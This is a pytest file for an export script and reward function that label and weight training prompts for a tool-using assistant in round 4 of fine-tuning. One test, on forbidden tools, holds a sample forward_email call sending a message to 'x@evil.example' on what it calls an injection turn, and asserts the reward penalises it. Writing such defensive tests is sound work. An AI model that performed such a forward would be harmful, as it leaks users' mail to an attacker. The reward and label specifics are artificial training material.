"""Tests for export_prompts.py's round-4 pieces (labels and mix); pure python, no tokenizer.
Run: python -m pytest -q test_export_r4.py"""
import json
import random
import sys
from collections import Counter
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import export_prompts as X  # noqa: E402
import reward as W  # noqa: E402

CLOCK = {"role": "system", "content": "\nThe current date and time is Tuesday, April 6, 2027 at 10:37 PM."}
RULES = {"role": "system", "content": "RULES " * 2000}


def call_msg(name, args, cid="c1"):
    return {"role": "assistant", "content": "", "tool_calls": [{"id": cid, "type": "function", "function": {"name": name, "arguments": args}}]}


def example(history_calls, target, user="text Dad that I'm running late"):
    msgs = [RULES, CLOCK, {"role": "user", "content": user}]
    for i, (name, args, result) in enumerate(history_calls):
        msgs += [call_msg(name, args, f"c{i}"), {"role": "tool", "tool_call_id": f"c{i}", "content": result}]
    return {"messages": msgs + [target], "tools": []}


def meta(step, family="compose_r3", turn="compose_r3-001", writes=("send_message",), **kw):
    return {"id": f"{turn}-s{step}", "family": family, "step": step, "turn_writes": list(writes), "effects": [], **kw}


def test_turn_reads_are_the_reads_before_the_first_write():
    steps = [(0, ["get_tool_schemas"]), (1, ["lookup_contact"]), (2, ["get_upcoming"]), (3, ["send_message"]), (4, [])]
    assert X.turn_reads(steps, ["send_message"]) == ["lookup_contact", "get_upcoming"]
    assert X.turn_reads(list(reversed(steps)), ["send_message"]) == ["lookup_contact", "get_upcoming"]     # any order in
    assert X.turn_reads(steps, []) == []                                   # a turn with no write has nothing to protect
    assert X.turn_reads([(0, ["send_message"])], ["send_message"]) == []   # a write with no read before it
    assert X.turn_reads([(0, ["lookup_contact"]), (1, ["lookup_contact", "draft_email"])], ["draft_email"]) == ["lookup_contact"]
    assert X.turn_reads([(0, ["lookup_contact"]), (1, ["summarize_emails"])], ["send_email"]) == []        # the write never happens


def test_classify_r4_labels_requires_read_and_reads_done():
    turn = [(0, ["get_tool_schemas"]), (1, ["lookup_contact"]), (2, ["send_message"]), (3, [])]
    turns = {"compose_r3-001": turn}
    ex0 = example([], call_msg("lookup_contact", {"name": "Dad"}))
    lab0 = X.classify(ex0, meta(1), 4, turns, ["lookup_contact", "send_message", "summarize_emails"])
    assert lab0["round"] == 4 and lab0["requires_read"] == ["lookup_contact"] and lab0["reads_done"] == []
    assert not lab0["narrate"] and "ground" not in lab0
    ex1 = example([("lookup_contact", {"name": "Dad"}, "Dad: +1 555 0100")], call_msg("send_message", {"to": "Dad", "text": "late"}))
    lab1 = X.classify(ex1, meta(2), 4, turns, [])
    assert lab1["requires_read"] == ["lookup_contact"] and lab1["reads_done"] == ["lookup_contact"]
    # the reward reads the label exactly as written: early send -> -2, send after the read -> 0
    send = "\n<channel|><|tool_call>call:send_message{text:<|\"|>late<|\"|>}<tool_call|><|tool_response>"
    assert W.score(send, {**lab0, "forced": True}, rnd=4).parts["early_write"] == -2.0 or lab0["forbidden"]
    assert W.score(send, {**lab1, "forced": True}, rnd=4).parts["early_write"] == 0.0


def test_classify_r4_narrate_chat_ground_and_tool_names():
    final = {"role": "assistant", "content": "Dad's number is +1 555 0100."}
    ex = example([("lookup_contact", {"name": "Dad"}, "Dad: +1 555 0100")], final, user="what's Dad's number")
    lab = X.classify(ex, meta(2, writes=()), 4, {}, ["lookup_contact", "get_upcoming"])
    assert lab["narrate"] and not lab["chat"] and lab["requires_read"] == []
    assert "+1 555 0100" in lab["ground"] and "what's Dad's number" in lab["ground"] and '"name": "Dad"' in lab["ground"]
    assert "10:37 PM" in lab["ground"] and "RULES" not in lab["ground"]               # the clock yes, the long rules prompt no
    assert lab["tool_names"] == ["lookup_contact", "get_upcoming"]
    assert W.score("\n<channel|>" + final["content"] + "<turn|>", {**lab, "forced": True}, rnd=4).parts["ungrounded"] == 0.0
    chat = X.classify(example([], {"role": "assistant", "content": "That sounds lovely."}, user="i had a good day"),
                      meta(0, family="chat_voice_r3", writes=()), 4, {}, [])
    assert chat["chat"] and not chat["narrate"] and "ground" not in chat
    # a round-3 export is unchanged: none of the new fields
    old = X.classify(ex, meta(2, writes=()))
    assert not ({"round", "narrate", "chat", "ground", "requires_read", "reads_done", "tool_names"} & set(old))


def item(i, family, narrate=False, facts=()):
    return {"id": f"{family}-{i}", "family": family, "prompt": "p", "weight": 1.0, "_tokens": 100,
            "label": {"narrate": narrate, "facts": list(facts), "step": "final" if narrate else "call"}}


def pool():
    items = []
    for fam, n_nar, n_dec in (("compose_r3", 300, 300), ("safe_restraint", 200, 200), ("gather_then_send_r4", 100, 100),
                              ("restraint_r4", 100, 100), ("reminders_r3", 200, 200), ("mail_r3", 400, 400), ("device_r3", 300, 300), ("chat_voice_r3", 200, 200),
                              ("instructions_r4", 150, 150), ("session_recall_r4", 120, 120), ("session_chat_r4", 100, 100)):
        items += [item(f"n{i}", fam, True, ["6 PM"]) for i in range(n_nar)] + [item(f"d{i}", fam) for i in range(n_dec)]
    return items


def test_r4_mix_shares():
    rng = random.Random(1)
    pics = [dict(item(f"p{i}", "picture_turn_r3"), weight=1.0) for i in range(30)]
    n_all, n_mm = 1488, 223
    rows, st = X.r4_text_rows(pool(), pics, n_all - n_mm, n_all, rng)
    assert len(rows) == n_all - n_mm and st["short"] == {}
    b = Counter(X.r4_bucket(r) for r in rows)
    assert abs(b["narrate"] / n_all - 0.30) < 0.01
    assert abs(b["compose"] / n_all - 0.20) < 0.01
    assert abs(b["session"] / n_all - 0.15) < 0.01                       # standing instructions and session recall are in the mix
    assert abs((b["other"]) / n_all - 0.20) < 0.02
    # narrate is any family but the session ones; compose holds only decision steps of the safety families
    assert all(not r["label"]["narrate"] for r in rows if X.r4_bucket(r) == "compose")
    assert {r["family"] for r in rows if X.r4_bucket(r) == "session"} <= X.SESSION_FAMILIES
    assert not any(r["family"] in X.SESSION_FAMILIES for r in rows if X.r4_bucket(r) != "session")
    assert {r["family"] for r in rows if X.r4_bucket(r) == "compose"} <= X.COMPOSE_SAFETY_FAMILIES
    assert not any(r["family"] in X.COMPOSE_SAFETY_FAMILIES for r in rows if X.r4_bucket(r) == "other")
    assert sum(r["family"] == "picture_turn_r3" for r in rows) == 30             # the picture-turn rows ride along


def test_r4_mix_upweights_the_named_families():
    rng = random.Random(2)
    rows, _ = X.r4_text_rows(pool(), [], 1265, 1488, rng)
    comp = Counter(r["family"] for r in rows if X.r4_bucket(r) == "compose")
    pools = Counter(i["family"] for i in pool() if i["family"] in X.COMPOSE_SAFETY_FAMILIES and not i["label"]["narrate"])
    rate = {f: comp[f] / pools[f] for f in pools}
    # inside the compose bucket the named families are drawn at a higher rate than the one at weight 1.0
    assert min(rate["safe_restraint"], rate["gather_then_send_r4"], rate["restraint_r4"]) > rate["reminders_r3"] * 1.5
    assert rate["compose_r3"] > rate["reminders_r3"]
    assert X.r4_weight(item(1, "safe_restraint")) == 3.0 and X.r4_weight(item(1, "compose_r3")) == 2.5
    assert X.r4_weight(item(1, "mail_r3", True, ["6 PM"])) == X.R4_FACT_BONUS > X.r4_weight(item(1, "mail_r3", True))


def test_r4_mix_copies_are_capped_and_a_thin_bucket_is_reported():
    rng = random.Random(3)
    thin = [item(i, "mail_r3", True, ["6 PM"]) for i in range(10)] + [item(i, "device_r3") for i in range(2000)]
    rows, st = X.r4_text_rows(thin, [], 1265, 1488, rng)
    assert Counter(r["id"] for r in rows).most_common(1)[0][1] <= X.MAX_COPIES
    q = st["quota"]
    assert st["got"]["narrate"] == X.MAX_COPIES * 10 and st["short"]["narrate"] == q["narrate"] - 30
    assert st["got"]["compose"] == 0 and st["short"]["compose"] == q["compose"]       # no safety-family rows in this pool


def test_r4_defaults_point_at_the_r4_dirs():
    root = Path(X.__file__).resolve().parent.parent.parent / "ask-lora-r4"
    assert root.name == "ask-lora-r4" and root.parent.name == "training"


# =========================================================================== round 4: audit repairs
def chat_example(user, reply, extra=()):
    msgs = [RULES, CLOCK]
    for u, a in extra:
        msgs += [{"role": "user", "content": u}, {"role": "assistant", "content": a}]
    return {"messages": msgs + [{"role": "user", "content": user}, {"role": "assistant", "content": reply}], "tools": []}


# ---- reward-0: chat finals that end in a question are not "ask" rows
def test_r4_chat_families_never_become_ask_rows():
    reply = "Which kind of tired are you tonight, giggly or sleepy?"
    for fam in ("chat_voice_r3", "chat_voice_r4", "chat_direct_r4", "session_chat_r4", "knowledge_direct", "concise_gentle"):
        lab = X.classify(chat_example("soft landing movie", reply), meta(0, family=fam, writes=()), 4, {}, [])
        assert lab["step"] == "final" and lab["final"] and not lab["ask"] and lab["chat"], fam
    # a real clarification in a decision family is still an ask
    ask = X.classify(chat_example("text alex", "Which Alex do you mean?"), meta(0, family="restraint_r4", writes=()), 4, {}, [])
    assert ask["step"] == "ask" and ask["ask"]
    # round 3 export: unchanged (the r3 chat name set only)
    old = X.classify(chat_example("soft landing movie", reply), meta(0, family="chat_direct_r4", writes=()))
    assert old["step"] == "ask"


def test_r4_chat_reply_scores_the_same_with_and_without_a_trailing_question():
    ex = chat_example("soft landing movie", "Paddington is a gentle pick. Which kind of tired are you tonight, giggly or sleepy?")
    lab = {**X.classify(ex, meta(0, family="chat_direct_r4", writes=()), 4, {}, []), "forced": False}
    asked = W.score("Paddington is a gentle pick. Which kind of tired are you tonight?<turn|>", lab, rnd=4)
    plain = W.score("Paddington is a gentle pick. Tell me which kind of tired you are tonight.<turn|>", lab, rnd=4)
    assert asked.total == plain.total and asked.parts["facts"] == plain.parts["facts"]      # the "?" payoff is gone


def test_r4_instruction_families_ask_only_for_one_short_question():
    clarify = "Which ones: today's, tomorrow's, the overdue ones, or all of them?"
    lab = X.classify(chat_example("clean up my reminders", clarify), meta(0, family="instructions_r4", writes=()), 4, {}, [])
    assert lab["step"] == "ask"
    answer = ("Cold slows the chemical reactions inside a lithium-ion battery, so it can't deliver as much power and the "
              "percentage drops fast. Does that help?")
    lab = X.classify(chat_example("why does my phone die in the cold", answer), meta(0, family="instructions_r4", writes=()), 4, {}, [])
    assert lab["step"] == "final" and lab["chat"]
    lab = X.classify(chat_example("why", answer), meta(0, family="session_recall_r4", writes=()), 4, {}, [])
    assert lab["step"] == "final"


# ---- unsafe-2: every effectful tool of the live registry is forbidden unless the ideal turn calls it
NINE = ("forward_email", "organize_files", "toggle_setting", "mac_lock_screen", "save_knowledge", "delete_knowledge",
        "write_document", "create_tool", "window_control")


def test_r4_forbidden_lists_forward_email_and_the_other_effectful_tools():
    ex = example([], call_msg("list_dir", {"path": "~/Downloads"}), user="what is in my downloads")
    lab = X.classify(ex, meta(0, writes=()), 4, {}, [])
    assert set(NINE) <= set(lab["forbidden"]) and "list_dir" not in lab["forbidden"]
    old = X.classify(ex, meta(0, writes=()))
    assert not (set(NINE) & set(old["forbidden"]))                                # the r3 export is unchanged
    # a tool the ideal turn calls (or is about to) is never forbidden
    own = X.classify(example([], call_msg("forward_email", {"message_id": "m1", "to": "dad@example.com"})), meta(0, writes=("forward_email",)), 4, {}, [])
    assert "forward_email" not in own["forbidden"] and "organize_files" in own["forbidden"]
    # and the reward reads it: forwarding on an injection turn loses 2, the read does not
    fwd = "\n<channel|><|tool_call>call:forward_email{message_id:<|\"|>m1<|\"|>,to:<|\"|>x@evil.example<|\"|>}<tool_call|><|tool_response>"
    assert W.score(fwd, {**lab, "forced": True}, rnd=4).parts["forbidden"] == -2.0


def test_r4_write_list_covers_the_live_registry():
    live = X.live_effect_tools()
    if live is None:
        import pytest
        pytest.skip("service/ is not importable here")
    missing = sorted(live - X.WRITE_TOOLS_R4_STATIC)
    assert not missing, f"WRITE_TOOLS_R4 is behind the live registry: add {missing}"
    assert {"forward_email", "organize_files", "toggle_setting", "save_knowledge", "delete_knowledge", "write_document",
            "create_tool", "window_control"} <= live
    assert not (live & {"wisp_status", "wisp_skills", "list_running_apps"})       # read-only admin tools stay out


# ---- reward-2: instructions and recall labels
def test_instruction_wishes_become_constraints():
    d = X.derive_constraints
    assert d([], "one sentence only: what's lined up tomorrow") == [{"kind": "max_sentences", "n": 1}]
    assert d([], "weather tomorrow in under 15 words") == [{"kind": "max_words", "n": 15}]
    assert d([], "so one word: is it raining tomorrow?") == [{"kind": "max_words", "n": 1}]
    assert d([], "just yes or no: anything before 3pm?") == [{"kind": "yes_no_first"}]
    assert d([], "tomorrow's plan as a bulleted list please") == [{"kind": "bullets_only"}]
    assert d([], "any tips to fall asleep quicker?? numbered steps please") == [{"kind": "numbered"}]
    assert d([], "no bullets, just tell me") == [{"kind": "no_bullets"}]
    assert d([], "no emoji please") == [{"kind": "no_emoji"}]
    assert d([], "how many cups of water a day") == []
    for phrase in ("don't quiz me at the end of your answers", "do not ask me anything back", "stop quizzing me", "no more follow-up questions",
                   "no more questions", "don't finish with a question", "do not end with a question", "skip the question at the bottom"):
        assert d([], phrase) == [{"kind": "no_question"}] or d([phrase], "what causes thunder") == [{"kind": "no_question"}], phrase
    # standing wishes carry forward; the latest of a kind wins; a reset or a style change lifts them
    assert d(["stop ending your replies with questions", "why do onions make you cry"], "what causes thunder") == [{"kind": "no_question"}]
    assert d(["keep every reply to one sentence from here on", "x"], "y") == [{"kind": "max_sentences", "n": 1}]
    assert d(["one sentence per answer from now on", "ok normal answers are fine again"], "y") == []
    assert d(["one sentence per answer from now on", "actually, chill out and talk to me like a buddy"], "y") == []
    assert d(["answer in bullet points going forward", "actually, from now on keep answers to one sentence"], "y") == [{"kind": "max_sentences", "n": 1}]
    assert d(["lists are hard for me to read, use normal sentences"], "tomorrow?") == [{"kind": "no_bullets"}]
    assert d(["switch to spanish for all your answers"], "y") == [{"kind": "spanish"}]
    assert d(["how do you say thank you in spanish"], "y") == []                                # a question, not a wish
    assert d(["bullets please, every time"], "tomorrow, one sentence") == [{"kind": "bullets_only"}, {"kind": "max_sentences", "n": 1}]


def test_r4_instructions_label_keeps_only_constraints_the_ideal_answer_meets():
    earlier = [("keep every reply to one sentence from here on", "Okay, one sentence from now on.")]
    ok = chat_example("why do onions make you cry", "A gas in them irritates your eyes.", earlier)
    lab = X.classify(ok, meta(0, family="instructions_r4", writes=()), 4, {}, [])
    assert lab["constraints"] == [{"kind": "max_sentences", "n": 1}]
    broken = chat_example("why do onions make you cry", "A gas in them irritates your eyes. Chilling them first helps.", earlier)
    lab = X.classify(broken, meta(0, family="instructions_r4", writes=()), 4, {}, [])
    assert lab["constraints"] == []                                   # the ideal itself breaks it: misread, never trained on
    # a builder-supplied constraint list in the meta wins over the derivation
    given = X.classify(ok, meta(0, family="instructions_r4", writes=(), constraints=[{"kind": "no_digits"}]), 4, {}, [])
    assert given["constraints"] == [{"kind": "no_digits"}]
    # other families carry no constraints, round 3 neither
    assert "constraints" not in X.classify(ok, meta(0, family="mail_r3", writes=()), 4, {}, [])
    assert "constraints" not in X.classify(ok, meta(0, family="instructions_r4", writes=()))


def test_r4_instruction_label_drives_the_reward():
    earlier = [("keep every reply to one sentence from here on", "Okay, one sentence from now on.")]
    ex = chat_example("why do onions make you cry", "A gas in them irritates your eyes.", earlier)
    lab = {**X.classify(ex, meta(0, family="instructions_r4", writes=()), 4, {}, []), "forced": False}
    good = W.score("A gas in them stings your eyes.<turn|>", lab, rnd=4)
    bad = W.score("A gas in them stings your eyes. Cutting them under water helps. A sharp knife helps too.<turn|>", lab, rnd=4)
    assert good.parts["instruction"] == 0.5 and bad.parts["instruction"] == -0.5


def test_r4_recall_rows_carry_facts_ground_and_the_recall_flag():
    earlier = [("list my reminders", "You have: pay the parking ticket at 11:45 AM tomorrow.")]
    ex = chat_example("when does the first one go off", "The parking ticket is due tomorrow at 11:45 AM.", earlier)
    lab = X.classify(ex, meta(0, family="session_recall_r4", writes=()), 4, {}, [])
    assert lab["recall"] and "11:45 AM" in lab["facts"] and not lab["narrate"]
    assert "parking ticket" in lab["ground"] and "list my reminders" in lab["ground"]       # answer-first rows carry ground now
    # no extractable fact: a recall reference is built from words of the answer that the earlier turns contain
    ex = chat_example("what was the shuttle thing", "That was the shuttle to the airport.", [("book the airport shuttle", "Done, shuttle booked.")])
    lab = X.classify(ex, meta(0, family="session_recall_r4", writes=()), 4, {}, [])
    assert lab["recall"] and lab["facts"] and all(f.lower() in "book the airport shuttle done, shuttle booked." for f in lab["facts"])
    assert "recall" not in X.classify(ex, meta(0, family="session_recall_r4", writes=()))
    # a recall row whose ideal is itself a denial is marked so reward.py does not penalise it
    ex = chat_example("what was my parking spot", "Nothing is saved about your parking spot yet. I don't have that from before.", earlier)
    assert X.classify(ex, meta(0, family="session_recall_r4", writes=()), 4, {}, []).get("denial_ok") is True


# ---- reward-3: style label for distilled chat
def test_r4_distilled_chat_rows_carry_the_base_style():
    reply = "That sounds like a lovely slow evening \U0001F319 Pick something soft and familiar."
    lab = X.classify(chat_example("i want a cozy night", reply), meta(0, family="chat_voice_r4", writes=()), 4, {}, [])
    assert lab["style"] == {"words": len(reply.split()), "emoji": True}
    for fam in ("mail_r3", "knowledge_direct", "concise_gentle"):                 # authored targets are not the base's replies
        assert "style" not in X.classify(chat_example("hi", reply), meta(0, family=fam, writes=()), 4, {}, [])
    assert "style" not in X.classify(chat_example("i want a cozy night", reply), meta(0, family="chat_voice_r4", writes=()))


# ---- reward-4: the post-read label and the ideal thought length
def test_r4_post_read_label_and_thought_words():
    final = {"role": "assistant", "content": "Dad's number is +1 555 0100."}
    ex = example([("lookup_contact", {"name": "Dad"}, "Dad: +1 555 0100")], final, user="what's Dad's number")
    assert X.classify(ex, meta(2, writes=()), 4, {}, [])["post_read"] is True
    assert X.classify(example([], call_msg("lookup_contact", {"name": "Dad"})), meta(0, writes=()), 4, {}, [])["post_read"] is False
    done = "Dad's number is in the contact.\n<channel|>Dad: +1 555 0100<turn|>"
    assert X.thought_words(done, True) == 6
    assert X.thought_words("<channel|>Hello<turn|>", True) == 0


# ---- reward-2: the session bucket and its weights
def test_r4_session_families_are_weighted_up_and_bucketed_together():
    for fam in X.SESSION_FAMILIES:
        assert X.r4_bucket(item(1, fam, True, ["6 PM"])) == "session" and X.r4_bucket(item(1, fam)) == "session"
    assert X.R4_WEIGHTS["instructions_r4"] == X.R4_WEIGHTS["session_recall_r4"] == 2.0 > X.R4_WEIGHTS["session_chat_r4"] > 1.0
    assert abs(X.R4_NARRATE_SHARE + X.R4_COMPOSE_SHARE + X.R4_SESSION_SHARE - 0.65) < 1e-9 and X.R4_SESSION_SHARE == 0.15
    rng = random.Random(4)
    rows, st = X.r4_text_rows(pool(), [], 1265, 1488, rng)
    ses = [r for r in rows if r["family"] in X.SESSION_FAMILIES]
    assert abs(len(ses) / 1488 - 0.15) < 0.01 and st["got"]["session"] == st["quota"]["session"] and "session" not in st["short"]
    cnt = Counter(r["family"] for r in ses)
    pools = Counter(i["family"] for i in pool() if i["family"] in X.SESSION_FAMILIES)
    assert cnt["instructions_r4"] / pools["instructions_r4"] > cnt["session_chat_r4"] / pools["session_chat_r4"]    # 2.0 beats 1.5 per row
